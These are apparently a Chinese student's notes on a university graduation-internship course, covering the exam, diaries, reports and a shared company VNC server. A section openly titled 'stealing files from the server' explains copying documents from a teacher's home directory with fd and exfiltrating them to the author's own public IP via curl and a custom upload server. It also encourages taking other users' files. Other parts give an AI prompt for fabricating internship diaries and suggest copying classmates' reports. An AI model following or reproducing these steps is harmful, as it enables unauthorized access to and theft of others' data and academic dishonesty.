# 毕业实习

大四的最后一门课，故意放在考研后，避免挤占考研复习时间。这个时间点，大家未来的研究方向/就业方向已经决定了吧，不是每个人都去做芯片的，我认为，如果跟自己的方向不重合，就不用听。

（笑死，上课去的人还不到一半，没有签到，随便翘。大家都有自己的事，谁来听这个毕业实习。）

不像其他专业的毕业实习，信息工程专业没有任何企业参观，全部在教室学东西，只是请了个企业讲师来讲课。[上课安排](./上课安排.xlsx)

## 考试

考试决定平时成绩，占总成绩 30%

最后一天有一个考试，一小时。开卷，允许上网查资料，除了不能用手机拍照其他的都可以干，所以完全没有必要专门去学习。请谨慎使用 AI，因为可能会给出错误的答案。

交卷时我把考题悄悄拍下来了，给后人留下[一些参考](./考试)。都非常简单的题目。

## 资料

- [飞书链接](https://k0wclrk5a3j.feishu.cn/drive/folder/CCxzfWBR8lKaARdFi0jcqXIunlj)

## 日记与报告

剩下的是日记与报告，占总成绩的 70%。

### 日记

让我们用 AI：

```
我目前正在参加一项实践课程，需要每天写一篇实习日记，包含自己学到的东西与新得体会。稍后我会将学习主题和资料发送给你，每次代表这一天学习的主题，请你帮我每天写一篇日记。至于学到了什么具体的内容，你可以自己补充。日记风格是个人感悟式的抒发，长度约为 300-400 字，希望包含一些遇到的困难与解决方法。
```

### 报告

报告允许全部使用电子版编写，打印后贴到报告本里。

内容就等等其他人，~~或者因为大家寒假都急着回家，此时自告奋勇留在学校收报告，就可以大抄特抄了~~。至于图片，找熟人要一下，或者网上找找都行。

## 传文件到服务器

现在是 AI 时代，想必大家都不愿意在服务器里手打，而是 AI 辅助完成后再传到服务器上调试。（或者传一些 Linux 工具）

<details><summary>展开</summary>

我们使用 VNC 面板连接到企业提供的服务器。VNC 端口 <124.152.95.232:5999>，这玩意甚至 ping 不通。服务器本身不支持通过 VNC 文件传输：_VNC Server does not support file transfer_。

服务器上每个人都是一个用户，并没有做虚拟机级别的隔离。虽然我不能访问其他同学的 HOME 目录，但是老师的 home 可以访问。（不知道为啥留个洞）

查看 `/etc/ssh/ssh_config`，看到 Port 为 2222，尝试连接无效，基本能推断出给的 IP 只是一个反代。

在服务器上 `ping baidu.com` 无效，没做 dhcp。但是尝试 ping 一个 IP，正常，说明有网络连接。那就好办了，因为我们每个宿舍都有公网 IP。

在本机开一个 http server（`python -m http.server 55555`），去路由器设置里把本机这个端口暴露到公网。然后在服务器上 `wget http://xxx.xxx.xx.xxx:55555/myfile.txt`，就可以从本机传文件到服务器上了。

然后过了一阵子，课程结束，这时候我发现没法传文件上去了，对外网络已经全部关掉了。也不知道是发现了这个 bug 还是咋地。于是没辙，只好尝试一下 VNC 本身的剪贴板交互。这样只能传输字符，对传二进制需要额外处理。

1. Ctrl + Shift + C 复制，Ctrl + Shift + V 粘贴。不过遇到软件本身的 shell 时可能会有光标错位的情况，这时候请使用 gvim 编辑器粘贴命令到脚本中，再执行脚本。
2. 在 python 中可以使用 `pyautogui` 模块来模拟键盘输入。具体代码在 [send_text.py](./send_text.py) 中。将要发送的内容写到 `text_to_send` 文件中，VNC 里打开 vim 准备输入，然后运行脚本，切换到 VNC 窗口。这样可能会有格式问题，因为 VNC 上的 vim 被配置了自动缩进。我们需要在 `~/.vimrc` 的末尾添加：
   ```
   set noautoindent
   set nosmartindent
   set nocindent
   ```
   这样再运行即可。

</details>

## 从服务器偷文件

<details><summary>展开</summary>

我传了一个 [fd](https://github.com/sharkdp/fd) 用来在教师盘里找文件。我更习惯 fd，感觉比 find 好用。然后用类似 `fd -H -e jpg -e doc -e docx -e ppt -e pptx -x cp {} ~/my` 把貌似有用的资料全部偷下来。

那么如何传到自己的电脑呢？首先打个 tar.gz，然后有两个方法。

1. 由于自己电脑有公网 IP，所以直接用基于 ssh 的 scp/rsync 即可。需要在 _windows 设置 - 系统 - 可选功能_ 里安装 OpenSSH 服务器，然后把 22 端口开放到公网。
2. 改一改 http server 的代码，让它可以接受数据输入。用 GPT 快速糊一个：

   ```python
   import os
   from http.server import HTTPServer, SimpleHTTPRequestHandler


   class UploadHandler(SimpleHTTPRequestHandler):
       def do_POST(self):
           # 获取上传文件的长度
           content_length = int(self.headers["Content-Length"])

           # 读取上传的文件内容
           file_content = self.rfile.read(content_length)

           # 获取上传的文件名
           filename = os.path.basename(self.path)

           # 将文件写入到当前目录
           with open(filename, "wb") as f:
               f.write(file_content)

           # 返回成功响应
           self.send_response(200)
           self.end_headers()
           self.wfile.write(b"File uploaded successfully")


   if __name__ == "__main__":
       # 设置服务器地址和端口
       server_address = ("", 55555)
       httpd = HTTPServer(server_address, UploadHandler)

       print("Starting server on port 55555...")
       httpd.serve_forever()
   ```

   运行，然后就可以通过 POST 命令上传文件了。这里使用 curl：`curl --noproxy '*' -x POST --data-binary @my.tar.gz http://xxx.xxx.xx.xx:55555/a.tar.gz`。noproxy 是必要的，服务器上有奇怪的代理设置。

   或者不用 gpt 脚本，直接用现成库 [uploadserver](https://github.com/Densaugeo/uploadserver) 也行。

仿照这个例子，再把有访问权限的其他人的东西给偷过来。

结果最后发现好像没有偷到什么有价值的东西。

</details>
